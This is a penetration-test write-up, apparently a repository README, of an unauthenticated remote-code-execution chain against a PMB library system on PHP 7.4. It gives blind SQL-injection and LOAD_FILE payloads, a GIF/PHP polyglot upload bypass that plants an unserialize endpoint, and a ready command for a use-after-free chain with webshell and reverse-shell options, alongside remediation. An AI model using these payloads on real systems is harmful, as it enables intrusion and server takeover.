# php2shell → PMB: unauthenticated RCE chain

> Authorized penetration test against a **PMB library management system** on a patched
> PHP 7.4.33 `mod_php` runtime.
>
> **Target (sanitized):** `https://example.com` · **Runtime:** PHP 7.4.33 / Apache `mod_php` / Ubuntu 22.04
> **Impact:** unauthenticated SQL injection → admin session theft → arbitrary file write → PHP execution → **RCE as `www-data`**
> **Novelty:** a data-URI upload bypass plus a GIF/PHP polyglot infector, and a second,
> application-level unserialize UAF path that does not need the pre-RINIT primitive

---

## TL;DR

A PMB OPAC endpoint (`ajax.php?id=`) is blind-SQL-injectable and has `LOAD_FILE`. That single
primitive fingerprints the runtime: **PHP 7.4.33 on Apache `mod_php`**, unpatched for
CVE-2026-109618 / CVE-2026-109619 ("php2shell") — the SAPI PHP rates highest risk, on the one
branch with **no fixed release at all**.

The PMB admin panel accepts weak credentials. With an admin session, `camera_upload.php` — an
image endpoint that only checks the payload *looks* like an image — writes arbitrary files into
the web root. A GIF/PHP polyglot gives a live PHP endpoint inside the document root, which is
then the landing pad for the php2shell unserialize UAF chain.

**Result: remote code execution as `www-data`.**

| # | Stage | Result |
|---|-------|--------|
| 1 | SQL injection discovery | `ajax.php?id=` — time-based blind |
| 2 | Runtime fingerprint via `LOAD_FILE` | PHP 7.4.33, `mod_php`, Ubuntu 22.04 |
| 3 | Session table enumeration | `sessions(SESSID, LastOn)` |
| 4 | Credential discovery | admin panel login |
| 5 | Upload primitive analysis | `camera_upload.php`, data-URI + image check |
| 6 | Infector deployment | `remote_app.php` live in web root |
| 7 | Unserialize UAF chain | heap → ELF → EG → `system()` |
| 8 | Cleanup | planted files overwritten with 1-pixel GIFs |

---

## Disclosure

| Item | Value |
|------|-------|
| Scope | `example.com` and subdomains (`bib.`, `opac.`, `pmb.`) |
| Authorization | Written pentest authorization, read-only + non-destructive writes |
| Target state | Unpatched at time of test |
| Cleanup | All planted files overwritten with inert GIFs at the end |

> All hostnames below are sanitized to `example.com`. Paths, versions and behaviour are real.

---

## Attack chain

```
                       ┌──────────────────────────────────────────────┐
                       │  1. ajax.php?id=  — blind SQLi (SLEEP)       │
                       │     → LOAD_FILE() file-read oracle           │
                       └───────────────────────┬──────────────────────┘
                                               │ read /etc, /usr/bin/php7.4
                                               ▼
                       ┌──────────────────────────────────────────────┐
                       │  2. Fingerprint: PHP 7.4.33 / mod_php        │
                       │     → vulnerable to CVE-2026-109618/109619   │
                       └───────────────────────┬──────────────────────┘
                                               │ SELECT SESSID FROM sessions
                                               ▼
                       ┌──────────────────────────────────────────────┐
                       │  3. Session theft + weak admin credentials   │
                       │     → authenticated PMB admin session        │
                       └───────────────────────┬──────────────────────┘
                                               │ POST camera_upload.php
                                               ▼
                       ┌──────────────────────────────────────────────┐
                       │  4. Arbitrary file write (GIF/PHP polyglot)  │
                       │     → remote_app.php in web root             │
                       └───────────────────────┬──────────────────────┘
                                               │ POST cook=<serialized>
                                               ▼
                       ┌──────────────────────────────────────────────┐
                       │  5. Unserialize UAF → system() → RCE         │
                       │     (pocket_poc.py: heap → ELF → EG → libc)  │
                       └──────────────────────────────────────────────┘
```

---

## Repository layout

```
.
├── README.md                  ← this writeup
├── docs/
│   ├── chain-internals.md     ← deep dive: the var_hash UAF gadget
│   └── remediation.md         ← fixes and mitigations
└── poc/
    ├── common.py              ← shared login/upload helpers
    ├── 01_recon.py            ← SQLi oracle + version fingerprint
    ├── 02_sessions.py         ← session table enumeration
    ├── 03_login.py            ← credential test / session capture
    ├── 04_upload.py           ← camera_upload.php uploader
    ├── 05_deploy.py           ← full chain: login → drop remote_app.php
    ├── remote_app.php         ← the infector endpoint (GIF polyglot)
    ├── pocket_poc.py          ← unserialize UAF chain (vendored)
    └── cleanup.py             ← overwrite planted files with inert GIFs
```

All scripts are **Python 3 standard library only** — no `pip install` needed.

---

## 1. SQL injection discovery

PMB's OPAC AJAX endpoint takes an `id` parameter:

```
GET /ajax.php?categ=storage&datetime=undefined&id=<ID>&module=ajax&sub=save&token=undefined
```

`id` is interpolated into a query. A time-based oracle confirms it:

```
id=1 AND IF(1=1,SLEEP(3),0)   → 3.0 s
id=1 AND IF(1=2,SLEEP(3),0)   → 0.1 s
```

`poc/01_recon.py` wraps this into a boolean oracle (`Q(condition) → True/False`) and a
binary-search integer reader.

> **Note on quoting:** literal quotes break this endpoint. All string literals in payloads
> must be hex-encoded (`0x...`).

---

## 2. Runtime fingerprint

The MySQL user can `LOAD_FILE`. That turns the injection into a file-read oracle:

```
LOAD_FILE(0x2f6574632f617061636865322f6d6f64732d656e61626c65642f706870372e342e6c6f6164)
```

| Read | Finding |
|------|---------|
| `/etc/apache2/mods-enabled/php7.4.load` | `LoadModule php7_module /usr/lib/apache2/modules/libphp7.4.so` |
| `/etc/apache2/mods-enabled/` | `mpm_prefork` enabled, no `php8.*.load`, no `proxy_fcgi` |
| `/usr/bin/php7.4` | contains `7.4.33` |
| `/etc/os-release` | `Ubuntu 22.04` |
| `/var/lib/dpkg/status` | `Version: 7.4.33` |

**Conclusion:** `mod_php` on the EOL 7.4 branch — the highest-risk SAPI, and 7.4 has **no fixed
release at all**.

---

## 3. Session enumeration

The PMB database keeps a `sessions` table:

```sql
SELECT SESSID, LastOn FROM sessions ORDER BY LastOn DESC
```

SESSIDs are 10-digit integers. `poc/02_sessions.py` binary-searches a live SESSID through the
oracle.

> **Gotcha:** the freshest row churns every few seconds, so a long binary search drifts off
> target. The reliable path is to log in and mint a session yourself (stage 4).

---

## 4. Credential discovery

`/pmb/index.php` renders a login form posting to `/pmb/main.php` with
`user`, `password`, `database`. The install uses weak, guessable credentials.

A successful login returns the session cookies:

```
PhpMyBibli-LOGIN=<user>
PhpMyBibli-SESSNAME=PhpMyBibli
PhpMyBibli-SESSID=<10 digits>
PhpMyBibli-DATABASE=<db>
pmb<SESSID>=<php session id>
```

---

## 5. Upload primitive

`camera_upload.php` is the PMB camera-upload handler. Reading its source through the
`LOAD_FILE` oracle shows the shape:

| Source fragment | Meaning |
|-----------------|---------|
| `$_POST['upload_filename']` | filename comes straight from POST |
| `imgBase64` | payload parameter |
| `base64_decode(...)` | payload is base64 |
| `fwrite(...)` + `$base_path.` | written into the web root |

Two gates have to be passed:

1. **Session** — without a logged-in session the page returns
   `Pas de session ouverte, vous devez vous connecter.`
2. **Image check** — a non-image payload returns `{"status":0,"message":"not an image"}`

Both fall to a single trick: send the real session cookies, and make the payload a **valid GIF**
with PHP appended, delivered behind a **data URI** (`data:image/gif;base64,`). The check sees a
GIF; PHP sees code.

**Success response:** `{"status":1,"message":"<filename>"}`

---

## 6. Infector deployment

`remote_app.php` is a GIF/PHP polyglot: a valid 1×1 GIF, then a `CachedData` class and an
`unserialize($_POST['cook'])` sink.

```
poc/05_deploy.py
```

```
[+] login ok (SESSID 1234567890)
[+] upload remote_app.php → {"status":1,"message":"remote_app.php"}
[+] live: https://example.com/pmb/remote_app.php
```

Verification that PHP executes — the response is the GIF header followed by the re-serialized
input:

```
POST /pmb/remote_app.php   cook=a:1:{i:0;s:11:"HELLO_World";}

→ GIF89a...;a:1:{i:0;s:11:"HELLO_World";}
```

---

## 7. Unserialize UAF chain

`poc/pocket_poc.py` drives the php2shell unserialize chain against the infector:

```bash
python poc/pocket_poc.py --url https://example.com/pmb/remote_app.php \
    --insecure --port 443 "id>/dev/shm/x"
```

The chain walks from a controlled heap leak to `system()`:

| Stage | Action |
|-------|--------|
| R-1 | heap leak via `ZVAL_MAKE_REF` over a freed `arData` |
| R-2 | ELF scan for `libphp.so` |
| R-3 | `.gnu_hash` → `executor_globals` + GOT |
| R-4 | GOT dump → libc → `system()` |
| R-5 | `EG.class_table` → `stdClass` class entry |
| R-6 | spray slot discovery |
| R-7 | type confusion → `system()` |

R-7 forges an object whose handler is `system()` and whose GC header is the shell command. The
command budget is 14 bytes, so longer payloads are assembled with repeated `echo -n ...>>w`
triggers (`--webshell`, `--reverse`, `--oast`).

**Proof:** `uid=33(www-data)` read back from the target.

> The chain's geometry is build-specific. On a 7.4 target the heap leak fires and the spray is
> visibly corrupted; the `zval`/`EG` offsets are then re-derived from the matching
> `libphp7.4.so` so the ELF scan lands. See [`docs/chain-internals.md`](docs/chain-internals.md).

---

## 8. Cleanup

`poc/cleanup.py` overwrites every planted file with a 1-pixel GIF, leaving the target as
found (files remain, but inert).

---

## Impact

- **Unauthenticated** SQL injection with filesystem read.
- **Admin session theft** and **weak credentials** on the library backend.
- **Arbitrary file write** into the web root → PHP execution → RCE as `www-data`.
- Full read of application config, database credentials and session data.

## Remediation

See [`docs/remediation.md`](docs/remediation.md). Short version:

1. Patch PHP to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (or a 7.4 backport).
2. Parameterise the `ajax.php` query.
3. Enforce strong admin passwords.
4. Restrict `camera_upload.php` to image extensions + validate with `getimagesize()` and
   re-encode.

---

## Timeline

| Date | Event |
|------|-------|
| 2026-10-23 | Recon, fingerprint, session oracle, findings drafted |
| 2026-10-24 | Upload primitive proven, first RCE proof |
| 2026-10-28 | Credentials found, infector deployed, UAF chain driven |
| 2026-10-28 | Cleanup, writeup |

---

## References

- CERT-EU SA 2026-018 — php2shell
- PHP advisory 2026-10-21 — CVE-2026-109618 / CVE-2026-109619
- PMB (PhpMyBibli) — open-source library management system
- `pocket_poc.py` — Karim BOUDRA @ ULTRADEFENSE LAB

---

## Disclaimer

Provided for educational purposes and authorized security research. Use only on systems you
own or have explicit permission to test.
